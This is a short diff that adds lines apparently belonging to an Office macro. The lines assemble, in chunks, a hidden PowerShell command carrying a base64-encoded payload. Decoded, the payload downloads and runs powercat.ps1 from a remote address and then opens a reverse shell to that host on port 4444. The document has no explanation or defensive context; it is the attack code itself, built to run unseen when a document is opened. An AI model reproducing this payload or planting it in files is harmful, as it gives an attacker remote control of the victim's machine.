@@ -1,0 +1,5 @@
+Str = Str + "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY"
+Str = Str + "3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5"
+Str = Str + "nKCdodHRwOi8vMTkyLjE2OC40NS4yMjI6ODAwMC9wb3dlcmNhd"
+Str = Str + "C5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjQ1LjIyMiAtcCA"
+Str = Str + "0NDQ0IC1lIHBvd2Vyc2hlbGwK"
